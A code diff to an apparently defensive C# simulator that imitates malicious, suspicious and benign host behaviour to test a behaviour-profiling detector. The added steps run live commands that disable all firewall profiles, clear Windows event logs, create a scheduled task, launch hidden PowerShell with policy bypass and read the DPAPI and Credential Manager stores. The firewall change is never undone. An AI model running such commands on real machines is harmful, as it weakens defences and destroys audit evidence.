@@ -17,14 +17,18 @@ public static class Simulator
         Console.WriteLine("==============================================");
         Console.WriteLine("   CYBER BEHAVIOUR PROFILING SIMULATOR");
         Console.WriteLine("==============================================");
+        Console.WriteLine(" --- MODE 1 (Standard) ---");
         Console.WriteLine(" [1] MALICIOUS  - Escalating threat chain");
         Console.WriteLine(" [2] SUSPICIOUS - Probing and scanning");
         Console.WriteLine(" [3] BENIGN     - Ordinary software behavior");
+        Console.WriteLine(" --- MODE 2 (Alternative Variation) ---");
+        Console.WriteLine(" [4] MALICIOUS  - Stealth/Fileless & Persistence");
+        Console.WriteLine(" [5] SUSPICIOUS - System & Service Discovery");
+        Console.WriteLine(" [6] BENIGN     - Heavy Data & DB churn");
         Console.WriteLine(" [Q] QUIT");
         Console.WriteLine("----------------------------------------------");
-        Console.WriteLine(" NOTE: Press 1, 2, or 3 at ANY TIME during execution");
+        Console.WriteLine(" NOTE: Press 1-6 at ANY TIME during execution");
         Console.WriteLine(" to interrupt the current script and switch behaviors.");
-        Console.WriteLine(" This demonstrates live escalation/de-escalation!");
         Console.WriteLine("==============================================\n");
 
         Directory.CreateDirectory(Drop);
@@ -35,7 +39,7 @@ public static class Simulator
             if (key == 'q' || key == 'Q')
                 break;
 
-            if (key == '1' || key == '2' || key == '3')
+            if (key >= '1' && key <= '6')
             {
                 // Cancel current sequence if one is running
                 if (_currentSequence != null && !_currentSequence.IsCompleted)
@@ -50,10 +54,15 @@ public static class Simulator
                 _cts = new CancellationTokenSource();
                 int mode = key - '0';
                 
-                string modeName = mode == 1 ? "MALICIOUS" : mode == 2 ? "SUSPICIOUS" : "BENIGN";
+                string modeName = mode switch {
+                    1 or 4 => "MALICIOUS",
+                    2 or 5 => "SUSPICIOUS",
+                    3 or 6 => "BENIGN",
+                    _ => "UNKNOWN"
+                };
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine($"\n==============================================");
-                Console.WriteLine($" INITIATING {modeName} SEQUENCE");
+                Console.WriteLine($" INITIATING {modeName} SEQUENCE (MODE {(mode <= 3 ? 1 : 2)})");
                 Console.WriteLine($"==============================================");
                 Console.ResetColor();
 
@@ -70,9 +79,14 @@ public static class Simulator
         {
             switch (mode)
             {
+                // Mode 1
                 case 1: await RunMalicious(ct); break;
                 case 2: await RunSuspicious(ct); break;
                 case 3: await RunInconclusive(ct); break;
+                // Mode 2
+                case 4: await RunMalicious2(ct); break;
+                case 5: await RunSuspicious2(ct); break;
+                case 6: await RunInconclusive2(ct); break;
             }
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine($"\n[✓] Sequence finished safely.");
@@ -116,6 +130,31 @@ public static class Simulator
         await Phase("3 — SINGLE NETWORK CALL",    () => Inc_SingleNetwork(ct), ct);
         await Phase("4 — TEMP FILE WRITES",       () => Inc_TempWrites(ct), ct);
         await Phase("5 — DIRECTORY CHECKS",       () => Inc_DirectoryChecks(ct), ct);
+    }
+
+    // --- MODE 2 VARIATIONS ---
+    static async Task RunMalicious2(CancellationToken ct)
+    {
+        await Phase("1 — BASELINE",                     () => Baseline(ct), ct);
+        await Phase("2 — SCHEDULED TASK PERSISTENCE",   () => Mal2_ScheduledTask(ct), ct);
+        await Phase("3 — FIREWALL EVASION",             () => Mal2_FirewallEvasion(ct), ct);
+        await Phase("4 — CLEAR EVENT LOGS",             () => Mal2_ClearEventLogs(ct), ct);
+        await Phase("5 — MEMORY INJECTION (FILELESS)",  () => Mal2_FilelessExecution(ct), ct);
+    }
+
+    static async Task RunSuspicious2(CancellationToken ct)
+    {
+        await Phase("1 — BASELINE",                   () => Baseline(ct), ct);
+        await Phase("2 — SERVICE ENUMERATION",        () => Sus2_ServiceEnum(ct), ct);
+        await Phase("3 — EXCESSIVE REGISTRY QUERIES", () => Sus2_RegistryQueries(ct), ct);
+        await Phase("4 — HEAVY PING (DISCOVERY)",     () => Sus2_NetworkDiscovery(ct), ct);
+    }
+
+    static async Task RunInconclusive2(CancellationToken ct)
+    {
+        await Phase("1 — BASELINE",               () => Baseline(ct), ct);
+        await Phase("2 — SQLITE DB CHURN",        () => Inc2_DbChurn(ct), ct);
+        await Phase("3 — BROWSER CACHE WRITES",   () => Inc2_BrowserCache(ct), ct);
     }
 
     static async Task Baseline(CancellationToken ct)
@@ -230,29 +269,81 @@ public static class Simulator
         string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
-        string[] targets =
+        // --- A: probe common credential file locations (existence only) ---
+        string[] probeTargets =
         {
             Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Login Data"),
             Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Cookies"),
-            Path.Combine(appdata,  "Microsoft", "Credentials"),
-            Path.Combine(appdata,  "Microsoft", "Protect"),
             Path.Combine(home, ".ssh", "id_rsa"),
             Path.Combine(home, ".ssh", "known_hosts"),
             Path.Combine(appdata, "Mozilla", "Firefox", "Profiles"),
         };
-
         Log("Probing credential file locations...");
-        foreach (var target in targets)
+        foreach (var target in probeTargets)
         {
             ct.ThrowIfCancellationRequested();
-            try
-            {
-                bool exists = File.Exists(target) || Directory.Exists(target);
-                Log($"  {(exists ? "[found]" : "[not found]")} {target}");
-            }
-            catch { Log($"  [denied]  {target}"); }
+            try   { Log($"  {(File.Exists(target) || Directory.Exists(target) ? "[found]" : "[not found]")} {target}"); }
+            catch { Log($"  [denied] {target}"); }
             await Task.Delay(200, ct);
         }
+
+        // --- B: READ from DPAPI Protect store (\protect\ in path → SensitiveDirAccess hard indicator) ---
+        Log("Attempting to read DPAPI master key store...");
+        string protectDir = Path.Combine(appdata, "Microsoft", "Protect");
+        try
+        {
+            foreach (var entry in Directory.EnumerateFileSystemEntries(protectDir))
+            {
+                ct.ThrowIfCancellationRequested();
+                try
+                {
+                    using var fs = File.Open(entry, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                    byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
+                    _ = await fs.ReadAsync(buf, ct);
+                    Log($"  [read]   {entry}");
+                }
+                catch { Log($"  [denied] {entry}"); }
+                await Task.Delay(150, ct);
+            }
+        }
+        catch { Log($"  [no access] {protectDir}"); }
+
+        // --- C: READ from Credential Manager store (\credentials\ in path → SensitiveDirAccess hard indicator) ---
+        Log("Attempting to read Windows Credential Manager store...");
+        string credDir = Path.Combine(appdata, "Microsoft", "Credentials");
+        try
+        {
+            foreach (var credFile in Directory.EnumerateFiles(credDir))
+            {
+                ct.ThrowIfCancellationRequested();
+                try
+                {
+                    using var fs = File.Open(credFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                    byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
+                    _ = await fs.ReadAsync(buf, ct);
+                    Log($"  [read]   {credFile}");
+                }
+                catch { Log($"  [denied] {credFile}"); }
+                await Task.Delay(150, ct);
+            }
+        }
+        catch { Log($"  [no access] {credDir}"); }
+
+        // --- D: WRITE a staged dump to the Credentials folder ─────────────
+        // Filename contains "credentials" → matches _sensitiveFiles list → fires
+        // credential_file_access category event regardless of FileWrite noise check.
+        // That category is a hard indicator, bypassing all trust dampening.
+        Log("Writing staged credential dump to Credentials store...");
+        string dumpPath = Path.Combine(credDir, "sim_credentials.dump");
+        try
+        {
+            await File.WriteAllTextAsync(dumpPath, "SIM:CREDENTIAL_DUMP:PLACEHOLDER", ct);
+            Log($"  [written] {dumpPath}");
+            await Task.Delay(800, ct);
+            File.Delete(dumpPath);
+            Log($"  [cleaned] {dumpPath}");
+        }
+        catch { Log($"  [denied] credential dump write to {dumpPath}"); }
     }
 
     static async Task Mal_DataStagingAndExfil(CancellationToken ct)
@@ -279,12 +370,16 @@ public static class Simulator
         }
         Log($"  Wrote {count} additional staged payload chunks.");
 
-        Log("Simulating DNS Exfiltration (subdomain tunneling)...");
-        for (int i = 0; i < 3; i++)
+        Log("Simulating suspicious DNS resolution...");
+        string[] suspiciousDnsTargets =
+        {
+            "pastebin.com",
+            "raw.githubusercontent.com",
+            "api.telegram.org"
+        };
+        foreach (var dnsQuery in suspiciousDnsTargets)
         {
             ct.ThrowIfCancellationRequested();
-            string junkInfo = Guid.NewGuid().ToString("N");
-            string dnsQuery = $"{junkInfo}.evil-c2-domain.com";
             Log($"  DNS Query: {dnsQuery}");
             try { System.Net.Dns.GetHostEntry(dnsQuery); } catch { }
             await Task.Delay(100, ct);
@@ -394,12 +489,11 @@ public static class Simulator
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp"),
         };
 
-        Log("Checking if sensitive directories exist (no files opened)...");
+        Log("Enumerating sensitive directories and sampling readable files...");
         foreach (var dir in dirs)
         {
             ct.ThrowIfCancellationRequested();
-            bool exists = Directory.Exists(dir);
-            Log($"  {(exists ? "[exists]" : "[absent]")} {dir}");
+            await ProbeDirectoryAsync(dir, ct, sampleRead: true);
             await Task.Delay(300, ct);
         }
     }
@@ -501,12 +595,11 @@ public static class Simulator
             Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
         };
 
-        Log("Checking ordinary user directories...");
+        Log("Enumerating ordinary user directories...");
         foreach (var p in paths)
         {
             ct.ThrowIfCancellationRequested();
-            bool exists = Directory.Exists(p);
-            Log($"  {(exists ? "[exists]" : "[absent]")} {p}");
+            await ProbeDirectoryAsync(p, ct, sampleRead: true);
             await Task.Delay(500, ct);
         }
     }
@@ -546,14 +639,102 @@ public static class Simulator
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft"),
         };
 
-        Log("Checking common system directories...");
+        Log("Enumerating common system directories...");
         foreach (var dir in dirs)
         {
             ct.ThrowIfCancellationRequested();
-            bool exists = Directory.Exists(dir);
-            Log($"  {(exists ? "[exists]" : "[absent]")} {dir}");
+            await ProbeDirectoryAsync(dir, ct, sampleRead: true);
             await Task.Delay(400, ct);
         }
+    }
+
+    static async Task ProbeDirectoryAsync(string dir, CancellationToken ct, bool sampleRead)
+    {
+        ct.ThrowIfCancellationRequested();
+
+        if (!Directory.Exists(dir))
+        {
+            Log($"  [absent] {dir}");
+            return;
+        }
+
+        Log($"  [exists] {dir}");
+
+        try
+        {
+            int shown = 0;
+            foreach (var entry in Directory.EnumerateFileSystemEntries(dir))
+            {
+                Log($"    [entry] {entry}");
+                shown++;
+                if (shown >= 3)
+                    break;
+            }
+
+            if (shown == 0)
+                Log("    [empty]");
+        }
+        catch
+        {
+            Log($"    [enumeration denied] {dir}");
+        }
+
+        if (!sampleRead)
+            return;
+
+        string? sampleFile = FindFirstFile(dir, maxDepth: 2);
+        if (string.IsNullOrEmpty(sampleFile))
+        {
+            Log("    [no file to sample]");
+            return;
+        }
+
+        try
+        {
+            using var fs = File.Open(sampleFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+            int sampleLength = fs.Length > 0 ? (int)Math.Min(fs.Length, 32) : 1;
+            byte[] buffer = new byte[sampleLength];
+            _ = await fs.ReadAsync(buffer, ct);
+            Log($"    [sample read] {sampleFile}");
+        }
+        catch
+        {
+            Log($"    [sample read denied] {sampleFile}");
+        }
+    }
+
+    static string? FindFirstFile(string root, int maxDepth)
+    {
+        var pending = new Queue<(string Path, int Depth)>();
+        pending.Enqueue((root, 0));
+
+        while (pending.Count > 0)
+        {
+            var (dir, depth) = pending.Dequeue();
+
+            try
+            {
+                foreach (var file in Directory.EnumerateFiles(dir))
+                    return file;
+
+                if (depth >= maxDepth)
+                    continue;
+
+                int queued = 0;
+                foreach (var subDir in Directory.EnumerateDirectories(dir))
+                {
+                    pending.Enqueue((subDir, depth + 1));
+                    queued++;
+                    if (queued >= 3)
+                        break;
+                }
+            }
+            catch
+            {
+            }
+        }
+
+        return null;
     }
 
     private static readonly List<string> _extraDirs = [];
@@ -593,5 +774,107 @@ public static class Simulator
             try { Directory.Delete(dir, recursive: true); } catch { }
         try { Directory.Delete(Drop, recursive: true); } catch { }
         await Task.CompletedTask;
+    }
+
+    // --- NEW MODE 2 IMPLEMENTATIONS ---
+    
+    static async Task Mal2_ScheduledTask(CancellationToken ct)
+    {
+        Log("Adding scheduled task for persistence...");
+        await Spawn("schtasks.exe", "/create /tn \"SimulatedThreat\" /tr \"cmd.exe /c echo task\" /sc onlogon /f", showWindow: false);
+        await Task.Delay(1500, ct);
+
+        Log("Removing scheduled task...");
+        await Spawn("schtasks.exe", "/delete /tn \"SimulatedThreat\" /f", showWindow: false);
+    }
+
+    static async Task Mal2_FirewallEvasion(CancellationToken ct)
+    {
+        Log("Attempting to modify firewall rules via netsh...");
+        await Spawn("netsh.exe", "advfirewall set allprofiles state off", showWindow: false);
+        await Task.Delay(1500, ct);
+    }
+
+    static async Task Mal2_ClearEventLogs(CancellationToken ct)
+    {
+        Log("Attempting to clear System and Application event logs (Defense Evasion)...");
+        await Spawn("wevtutil.exe", "cl System", showWindow: false);
+        await Task.Delay(500, ct);
+        await Spawn("wevtutil.exe", "cl Application", showWindow: false);
+        await Task.Delay(1000, ct);
+    }
+
+    static async Task Mal2_FilelessExecution(CancellationToken ct)
+    {
+        Log("Spawning powershell with hidden window and bypass to simulate fileless execution...");
+        await Spawn("powershell.exe", "-w hidden -ep bypass -nop -c \"Start-Sleep -Seconds 5\"", showWindow: false);
+        await Task.Delay(2000, ct);
+    }
+
+    static async Task Sus2_ServiceEnum(CancellationToken ct)
+    {
+        Log("Enumerating services via sc.exe...");
+        await Spawn("sc.exe", "query", showWindow: false);
+        await Task.Delay(1000, ct);
+    }
+
+    static async Task Sus2_RegistryQueries(CancellationToken ct)
+    {
+        string[] keys = {
+            @"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
+            @"HKLM\System\CurrentControlSet\Services",
+            @"HKLM\Software\Microsoft\Windows Defender"
+        };
+        
+        Log("Querying sensitive registry keys...");
+        foreach(var key in keys)
+        {
+            ct.ThrowIfCancellationRequested();
+            await Spawn("reg.exe", $"query \"{key}\"", showWindow: false);
+            await Task.Delay(500, ct);
+        }
+    }
+
+    static async Task Sus2_NetworkDiscovery(CancellationToken ct)
+    {
+        Log("Pinging broadcast/multiple local addresses...");
+        await Spawn("ping.exe", "-n 4 8.8.8.8", showWindow: false);
+        await Task.Delay(2000, ct);
+    }
+
+    static async Task Inc2_DbChurn(CancellationToken ct)
+    {
+        string dir = Path.Combine(Drop, "db_sim");
+        Directory.CreateDirectory(dir);
+        Log("Simulating application local DB transactions...");
+        string dbFile = Path.Combine(dir, "local.db");
+        await File.WriteAllTextAsync(dbFile, "SQLite format 3\0", ct);
+        
+        for (int i = 0; i < 15; i++)
+        {
+            ct.ThrowIfCancellationRequested();
+            using (var fs = File.OpenWrite(dbFile))
+            {
+                fs.Seek(0, SeekOrigin.End);
+                await fs.WriteAsync(Encoding.UTF8.GetBytes($"Transaction {i}\n"), ct);
+            }
+            await Task.Delay(100, ct);
+        }
+        Log("  DB Churn complete.");
+    }
+
+    static async Task Inc2_BrowserCache(CancellationToken ct)
+    {
+        string dir = Path.Combine(Drop, "browser_sim_cache");
+        Directory.CreateDirectory(dir);
+        Log("Simulating browser caching engine writes...");
+        for (int i = 0; i < 20; i++)
+        {
+            ct.ThrowIfCancellationRequested();
+            string p = Path.Combine(dir, $"f_{Guid.NewGuid().ToString().Substring(0, 8)}.tmp");
+            await File.WriteAllTextAsync(p, $"CACHE_DATA_{i}", ct);
+            await Task.Delay(50, ct);
+        }
+        Log("  Cache writes complete.");
     }
 }
